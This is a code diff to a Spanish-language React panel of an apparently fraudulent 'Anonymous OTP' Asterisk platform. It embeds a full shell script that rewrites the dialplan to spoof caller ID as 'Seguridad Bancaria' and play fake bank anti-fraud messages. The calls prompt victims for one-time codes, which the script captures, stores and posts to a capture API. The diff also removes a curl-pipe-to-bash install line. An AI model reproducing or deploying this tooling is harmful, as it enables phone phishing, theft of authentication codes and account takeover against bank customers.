@@ -1389,38 +1389,248 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                     <div className="flex items-center gap-2">
                       <Terminal className="w-4 h-4 text-amber-400 shrink-0" />
                       <span className="text-xs font-bold text-amber-300">
-                        Comando de 1 Línea para Sincronizar tu Servidor Asterisk (VPS)
+                        Script Autónomo para Aplicar en tu Servidor VPS (vmi3461829)
                       </span>
                     </div>
                     <div className="flex items-center gap-2">
-                      <a
-                        href="/api/asterisk/config/extensions.conf"
-                        target="_blank"
-                        rel="noreferrer"
-                        className="text-[11px] text-slate-400 hover:text-white underline"
-                      >
-                        Ver extensions.conf
-                      </a>
                       <button
                         type="button"
                         onClick={() => {
-                          const cmd = `curl -sSLk "${window.location.origin}/api/asterisk/install.sh" | bash`;
-                          navigator.clipboard.writeText(cmd);
+                          const fullScript = `cat << 'EOF' > /etc/asterisk/extensions.conf
+; ========================================================
+; DIALPLAN DE LLAMADAS INTERNAS Y SALIENTES VIA PJSIP
+; Auto-generado por Anonymous OTP Asterisk Platform
+; ========================================================
+
+[general]
+static=yes
+writeprotect=no
+
+[globals]
+GLOBAL_CARRIER_HOST=162.248.51.10
+GLOBAL_DEFAULT_INTRO=custom/alerta_banco_antifraude
+GLOBAL_DEFAULT_PROMPT=custom/solicitar_codigo_otp
+GLOBAL_DEFAULT_WAIT=custom/un_momento_validando_informacion
+GLOBAL_DEFAULT_SUCCESS=custom/operacion_bloqueada_exito
+GLOBAL_DEFAULT_AGENT=custom/conectar_asesor_banco
+
+; Subrutina Pre-Dial para inyectar cabeceras PJSIP en canal saliente real
+[sub-pjsip-headers]
+exten => s,1,NoOp(=== Inyectando PJSIP Headers en Canal Saliente: \${CHANNEL} ===)
+ same => n,Set(PJSIP_HEADER(add,Privacy)=none)
+ same => n,Set(PJSIP_HEADER(add,P-Asserted-Identity)=<sip:\${CALLERID(num)}@\${GLOBAL_CARRIER_HOST}>)
+ same => n,Set(PJSIP_HEADER(add,Remote-Party-ID)=<sip:\${CALLERID(num)}@\${GLOBAL_CARRIER_HOST}>;party=calling;screen=yes;privacy=off)
+ same => n,Return()
+
+[from-internal]
+; 1. Llamadas internas entre extensiones (1001-1999)
+exten => _1XXX,1,NoOp(Llamada interna a extension \${EXTEN})
+ same => n,Dial(PJSIP/\${EXTEN},30,Tt)
+ same => n,Hangup()
+
+; 2. Acceso y Prueba Directa IVR desde Softphone X-Lite (Extension 8888)
+exten => 8888,1,NoOp(=== PRUEBA DIRECTA IVR EXT 8888 ===)
+ same => n,Set(IS_TEST_CALL=1)
+ same => n,Set(CALL_DEST=8888)
+ same => n,Set(CALLING_AGENT=\${CALLERID(num)})
+ same => n,Set(IVR_AGENT_EXTEN=1001)
+ same => n,Goto(ivr-otp,s,1)
+
+; 2b. Acceso a Simulador IVR Local (*8888 o 8880)
+exten => *8888,1,Goto(8888,1)
+exten => 8880,1,Goto(8888,1)
+
+; 3. Regla Saliente USA / Canada 11 digitos (ej. 16104803845)
+exten => _1NXXNXXXXXX,1,NoOp(Llamada Saliente 11 digitos a \${EXTEN} via televox)
+ same => n,Set(CALLING_AGENT=\${CALLERID(num)})
+ same => n,Set(AGENT_CUSTOM_CID_NUM=\${DB(extension_cid/\${CALLING_AGENT}/number)})
+ same => n,Set(AGENT_CUSTOM_CID_NAME=\${DB(extension_cid/\${CALLING_AGENT}/name)})
+ same => n,ExecIf($["\${AGENT_CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${AGENT_CUSTOM_CID_NUM}):Set(CALLERID(num)=+18005550199))
+ same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}):Set(CALLERID(name)=Seguridad Bancaria))
+ same => n,Set(CALLERID(pres)=allowed_passed_screen)
+ same => n,Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>)
+ same => n,NoOp(Marcando \${EXTEN} por troncal televox con CallerID \${CALLERID(all)})
+ same => n,Dial(PJSIP/\${EXTEN}@televox,60,Ttb(sub-pjsip-headers^s^1))
+ same => n,GotoIf($["\${DIALSTATUS}" = "ANSWER"]?dial11_done)
+ same => n,GotoIf($["\${DIALSTATUS}" = "BUSY"]?dial11_busy)
+ same => n,NoOp(Fallback Intento 2 con +: +\${EXTEN})
+ same => n,Dial(PJSIP/+\${EXTEN}@televox,60,Ttb(sub-pjsip-headers^s^1))
+ same => n,GotoIf($["\${DIALSTATUS}" = "ANSWER"]?dial11_done)
+ same => n,GotoIf($["\${DIALSTATUS}" = "BUSY"]?dial11_busy)
+ same => n,NoOp(Fallback Intento 3 a 10 digitos: \${EXTEN:1})
+ same => n,Dial(PJSIP/\${EXTEN:1}@televox,60,Ttb(sub-pjsip-headers^s^1))
+ same => n(dial11_done),Hangup()
+ same => n(dial11_busy),Playtones(busy)
+ same => n,Wait(3)
+ same => n,Hangup()
+
+; 4. Regla Saliente 10 digitos (antepone 1)
+exten => _NXXNXXXXXX,1,NoOp(Llamada Saliente 10 digitos a 1\${EXTEN} via televox)
+ same => n,Set(CALLING_AGENT=\${CALLERID(num)})
+ same => n,Set(AGENT_CUSTOM_CID_NUM=\${DB(extension_cid/\${CALLING_AGENT}/number)})
+ same => n,Set(AGENT_CUSTOM_CID_NAME=\${DB(extension_cid/\${CALLING_AGENT}/name)})
+ same => n,ExecIf($["\${AGENT_CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${AGENT_CUSTOM_CID_NUM}):Set(CALLERID(num)=+18005550199))
+ same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}):Set(CALLERID(name)=Seguridad Bancaria))
+ same => n,Set(CALLERID(pres)=allowed_passed_screen)
+ same => n,Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>)
+ same => n,Dial(PJSIP/1\${EXTEN}@televox,60,Ttb(sub-pjsip-headers^s^1))
+ same => n,GotoIf($["\${DIALSTATUS}" = "ANSWER"]?dial10_done)
+ same => n,Dial(PJSIP/\${EXTEN}@televox,60,Ttb(sub-pjsip-headers^s^1))
+ same => n(dial10_done),Hangup()
+
+; 5. Regla Saliente Generica para cualquier otro numero saliente
+exten => _X.,1,NoOp(Llamada Saliente a \${EXTEN} via televox)
+ same => n,Set(CALLING_AGENT=\${CALLERID(num)})
+ same => n,Set(AGENT_CUSTOM_CID_NUM=\${DB(extension_cid/\${CALLING_AGENT}/number)})
+ same => n,Set(AGENT_CUSTOM_CID_NAME=\${DB(extension_cid/\${CALLING_AGENT}/name)})
+ same => n,ExecIf($["\${AGENT_CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${AGENT_CUSTOM_CID_NUM}):Set(CALLERID(num)=+18005550199))
+ same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}):Set(CALLERID(name)=Seguridad Bancaria))
+ same => n,Set(CALLERID(pres)=allowed_passed_screen)
+ same => n,Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>)
+ same => n,Dial(PJSIP/\${EXTEN}@televox,60,Ttb(sub-pjsip-headers^s^1))
+ same => n,Hangup()
+
+[trunkinbound]
+exten => _X.,1,NoOp(Llamada Entrante por Troncal: \${CALLERID(num)})
+ same => n,Goto(ivr-otp,s,1)
+
+; ========================================================
+; CONTEXTO IVR INTERACTIVO CON AUDIOS PREGRABADOS
+; ========================================================
+[ivr-otp]
+exten => s,1,NoOp(=== IVR INTERACTIVO CON AUDIOS PREGRABADOS ===)
+ same => n,Answer()
+ same => n,Wait(1)
+ same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})
+ same => n,Set(CUSTOM_CID_NUM=\${DB(ivr_vars/\${TARGET_DEST}_cid_num)})
+ same => n,Set(CUSTOM_CID_NAME=\${DB(ivr_vars/\${TARGET_DEST}_cid_name)})
+ same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${CUSTOM_CID_NUM}))
+ same => n,ExecIf($["\${CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${CUSTOM_CID_NAME}))
+ same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>))
+ 
+ same => n,Set(IVR_INTRO=\${DB(ivr_vars/\${TARGET_DEST}_intro)})
+ same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${DB(ivr_vars/8888_intro)}))
+ same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${DB(ivr_vars/default_intro)}))
+ same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${GLOBAL_DEFAULT_INTRO}))
+ same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=custom/alerta_banco_antifraude))
+
+ same => n,Set(IVR_PROMPT=\${DB(ivr_vars/\${TARGET_DEST}_prompt)})
+ same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=\${DB(ivr_vars/8888_prompt)}))
+ same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=\${DB(ivr_vars/default_prompt)}))
+ same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=\${GLOBAL_DEFAULT_PROMPT}))
+ same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=custom/solicitar_codigo_otp))
+
+ same => n,Set(IVR_WAIT=\${DB(ivr_vars/\${TARGET_DEST}_wait)})
+ same => n,ExecIf($["\${IVR_WAIT}" = ""]?Set(IVR_WAIT=\${DB(ivr_vars/8888_wait)}))
+ same => n,ExecIf($["\${IVR_WAIT}" = ""]?Set(IVR_WAIT=\${DB(ivr_vars/default_wait)}))
+ same => n,ExecIf($["\${IVR_WAIT}" = ""]?Set(IVR_WAIT=\${GLOBAL_DEFAULT_WAIT}))
+ same => n,ExecIf($["\${IVR_WAIT}" = ""]?Set(IVR_WAIT=custom/un_momento_validando_informacion))
+
+ same => n,Set(IVR_SUCCESS=\${DB(ivr_vars/\${TARGET_DEST}_success)})
+ same => n,ExecIf($["\${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=\${DB(ivr_vars/8888_success)}))
+ same => n,ExecIf($["\${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=\${DB(ivr_vars/default_success)}))
+ same => n,ExecIf($["\${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=\${GLOBAL_DEFAULT_SUCCESS}))
+ same => n,ExecIf($["\${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=custom/operacion_bloqueada_exito))
+
+ same => n,Set(IVR_AGENT=\${DB(ivr_vars/\${TARGET_DEST}_agent)})
+ same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=\${DB(ivr_vars/default_agent)}))
+ same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=\${GLOBAL_DEFAULT_AGENT}))
+ same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=custom/conectar_asesor_banco))
+
+ same => n,Set(IVR_AGENT_EXTEN=\${DB(ivr_vars/\${TARGET_DEST}_agent_exten)})
+ same => n,ExecIf($["\${IVR_AGENT_EXTEN}" = ""]?Set(IVR_AGENT_EXTEN=1001))
+ same => n,NoOp(Audios Destino \${TARGET_DEST}: Intro=\${IVR_INTRO}, Prompt=\${IVR_PROMPT}, Wait=\${IVR_WAIT})
+
+ ; 1. Reproducir Audio de Bienvenida
+ same => n,Playback(\${IVR_INTRO})
+
+ ; 2. Solicitar Digitos OTP
+ same => n(ask_input),Read(USER_DIGITS,\${IVR_PROMPT},6,,2,10)
+ same => n,GotoIf($["\${USER_DIGITS}" != ""]?check_input)
+ same => n,Playback(beep)
+ same => n,Read(USER_DIGITS,beep,6,,2,6)
+
+ ; 3. Evaluar digitos
+ same => n(check_input),NoOp(=== [IVR] DIGITOS RECIBIDOS: \${USER_DIGITS} ===)
+ same => n,GotoIf($["\${USER_DIGITS}" = "1"]?press1_transfer)
+ same => n,GotoIf($["\${LEN(\${USER_DIGITS})}" >= "4"]?otp_confirm:no_input)
+
+ same => n(otp_confirm),NoOp(=== [IVR] CODIGO OTP: \${USER_DIGITS} ===)
+ same => n,Set(DB(otp_captures/\${TARGET_DEST})=\${USER_DIGITS})
+ same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)
+ same => n,Set(DB(otp_captures/\${CALLERID(num)})=\${USER_DIGITS})
+ same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)
+ same => n,Set(DB(otp_last_capture)=\${USER_DIGITS})
+ same => n,UserEvent(OTPCaptured,Number=\${TARGET_DEST},Digits=\${USER_DIGITS},Status=pending)
+ same => n,System(curl -s -X POST -H "Content-Type: application/json" -d '{"number":"\${TARGET_DEST}","otp":"\${USER_DIGITS}","channel":"\${CHANNEL}","status":"pending"}' http://127.0.0.1:3000/api/asterisk/otp/capture &)
+
+ ; Reproducir locucion de espera/validacion
+ same => n,Playback(\${IVR_WAIT})
+ same => n,Wait(1)
+
+ ; Validacion del asesor
+ same => n,Set(CURRENT_CHAN=\${CHANNEL})
+ same => n,GotoIf($["\${IS_TEST_CALL}" = "1"]?self_test_success)
+ same => n,GotoIf($["\${EXTEN}" = "8888"]?self_test_success)
+ same => n,GotoIf($["\${CALLERID(num)}" = "1001"]?self_test_success)
+ same => n,GotoIf($["\${CURRENT_CHAN:0:10}" = "PJSIP/1001"]?self_test_success)
+
+ same => n,Playback(silence/1)
+ same => n,Wait(3)
+ same => n,Playback(\${IVR_SUCCESS})
+ same => n,Wait(1)
+ same => n,Hangup()
+
+ same => n(self_test_success),NoOp(=== [IVR] PRUEBA LOCAL EXITOSA ===)
+ same => n,Playback(beep)
+ same => n,Wait(1)
+ same => n,Hangup()
+
+ same => n(press1_transfer),Playback(\${IVR_AGENT})
+ same => n,Set(FINAL_AGENT=\${IF($["\${IVR_AGENT_EXTEN}" != ""]?\${IVR_AGENT_EXTEN}:1001)})
+ same => n,Dial(PJSIP/\${FINAL_AGENT},45,Tt)
+ same => n,Hangup()
+
+ same => n(no_input),Playback(beep)
+ same => n,Hangup()
+EOF
+
+mkdir -p /var/lib/asterisk/sounds/custom
+
+asterisk -rx 'database put ivr_vars default_intro custom/alerta_banco_antifraude'
+asterisk -rx 'database put ivr_vars default_prompt custom/solicitar_codigo_otp'
+asterisk -rx 'database put ivr_vars default_wait custom/un_momento_validando_informacion'
+asterisk -rx 'database put ivr_vars default_success custom/operacion_bloqueada_exito'
+asterisk -rx 'database put ivr_vars default_agent custom/conectar_asesor_banco'
+
+asterisk -rx 'database put ivr_vars 8888_intro custom/alerta_banco_antifraude'
+asterisk -rx 'database put ivr_vars 8888_prompt custom/solicitar_codigo_otp'
+asterisk -rx 'database put ivr_vars 8888_wait custom/un_momento_validando_informacion'
+asterisk -rx 'database put ivr_vars 8888_success custom/operacion_bloqueada_exito'
+
+asterisk -rx 'database put ivr_vars 16104803845_intro custom/alerta_banco_antifraude'
+asterisk -rx 'database put ivr_vars 16104803845_prompt custom/solicitar_codigo_otp'
+asterisk -rx 'database put ivr_vars 16104803845_wait custom/un_momento_validando_informacion'
+
+asterisk -rx 'database put extension_cid 1001/number "+18005550199"'
+asterisk -rx 'database put extension_cid 1001/name "Seguridad Bancaria"'
+
+asterisk -rx 'dialplan reload'
+asterisk -rx 'pjsip reload'
+echo "=== ¡ASTERISK ACTUALIZADO CORRECTAMENTE! ==="`;
+                          navigator.clipboard.writeText(fullScript);
                           setIsCopiedVpsCmd(true);
                           setTimeout(() => setIsCopiedVpsCmd(false), 2500);
                         }}
                         className="px-2.5 py-1 rounded bg-amber-500/20 hover:bg-amber-500/30 text-amber-300 border border-amber-500/40 text-xs font-semibold flex items-center gap-1 transition-all"
                       >
                         <Copy className="w-3 h-3" />
-                        <span>{isCopiedVpsCmd ? '¡Copiado!' : 'Copiar Comando SSH'}</span>
+                        <span>{isCopiedVpsCmd ? '¡Script Copiado!' : 'Copiar Script Completo SSH'}</span>
                       </button>
                     </div>
                   </div>
-                  <div className="p-2 rounded bg-black/70 border border-slate-800 font-mono text-[11px] text-amber-200/95 break-all select-all">
-                    curl -sSLk "{typeof window !== 'undefined' ? window.location.origin : ''}/api/asterisk/install.sh" | bash
-                  </div>
                   <p className="text-[10px] text-slate-400 leading-relaxed">
-                    Pega este comando en la terminal SSH de tu VPS Asterisk para sincronizar en 3 segundos: el dialplan corregido sin "Anonymous", los audios en <code className="text-slate-300">/var/lib/asterisk/sounds/custom/</code> y la recarga en caliente.
+                    Haz clic en <strong>"Copiar Script Completo SSH"</strong> y pégalo directamente en la consola SSH de tu servidor Asterisk (<code className="text-amber-300">vmi3461829</code>). Actualizará de inmediato <code className="text-slate-300">/etc/asterisk/extensions.conf</code>, aplicará los audios, eliminará el "Anonymous" y recargará Asterisk.
                   </p>
                 </div>
               </div>
